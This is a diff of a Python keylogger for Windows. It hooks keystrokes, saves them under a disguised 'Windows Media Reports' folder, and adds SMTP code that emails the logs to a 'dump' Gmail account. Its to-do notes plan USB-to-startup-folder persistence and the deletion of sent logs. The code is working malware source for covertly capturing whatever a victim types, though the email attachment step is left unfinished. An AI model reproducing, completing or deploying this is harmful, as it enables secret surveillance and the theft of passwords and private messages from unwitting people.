@@ -5,15 +5,29 @@
 								To Do
 - Create a bash or python script that moves the files from usb to startup folder
 - Send file to dump email
-- 
+- Delete the old files that pass 7 days 
+- Send before you delete 
+- engulf the email section in an if statement so it doesn't run everyday
 
 								Bugs 
 - All letters are caplitlized
 - Numbers are mixed in where characters should be
 
 """
-
+# windows handling 
 import pyHook, pythoncom, os
+
+# get user's name
+import getpass
+
+# email handling
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+
+# get current date
 from datetime import datetime
 # get user's name so we can go to the directory
 from pathlib import Path
@@ -22,15 +36,56 @@ from pathlib import Path
 home = str(Path.home())
 
 # where to create new folder 
-newFolderDir = home + '\\Document\\Windows Media Reports\\' 
+newFolderDir = home + '\\Documents\\Windows Media Reports\\' 
 
 todays_date = datetime.now().strftime('%Y-%b-%d')
-file_name = home + '\\Document\\Windows Media Reports\\' + todays_date + '.txt'
+file_name = home + '\\Documents\\Windows Media Reports\\' + todays_date + '.txt'
+
+# dump email information
+emailUser = 'something@gmail.com'
+emailSend = 'something@gmail.com'
+subject = getpass.getuser() + " " + todays_date
+
+msg = MIMEMultipart()
+msg['From'] = emailUser
+msg['To'] = emailSend
+msg['Subject'] = subject
+
+body = 'Another one'
+msg.attach(MIMEText(body,'plain'))
+
+"""
+Here we are sending multiple files 
+** look at all files in the directory, attach them, send, and delete
+
+attachment = open('filename.txt', 'rb')
+"""
+
+part = MIMEBase('application', 'octet-stream')
+part.set_payload((attachment).read())
+encoders.encode_base64(part)
+part.add_header('Content-Disposition', "attachment; filename= " + file_name)
+
+msg.attach(part)
+text = msg.as_string()
+server = smtplib.SMTP('smtp.gmail.com', 587)
+server.starttls()
+server.login(emailUser, "pw")
+
+server.sendmail(emailUser,emailSend,text)
+server.quit()
+
+
+###########################################################################
+
+
+# Beginning of the Key Logger
 
 line_buffer = "" #current typed line before return character
 window_name = "" #current window
 
-# C:\Users\Henry\Document\Windows Media Reports\
+# C:\Users\NameOfUser\Document\Windows Media Reports\
+
 # create the folder for where the 
 def create_Directory():
     if not os.path.exists(newFolderDir):
@@ -76,13 +131,17 @@ def OnKeyboardEvent(event):
             pass #do nothing
         else:
             if(event.KeyID == 190):
-                line_buffer = line_buffer + '.'     
+                line_buffer = line_buffer + '.'
+            elif(event.KeyID == 164):
+            	pass # do nothing when tab is pressed 
             else:
                 line_buffer = line_buffer + str(event.KeyID) + '\n'
     else:
         line_buffer += chr(event.KeyID) #add pressed character to line buffer
         
     return True #pass event to other handlers
+
+print(subject)
 
 #creates the directory 
 create_Directory()
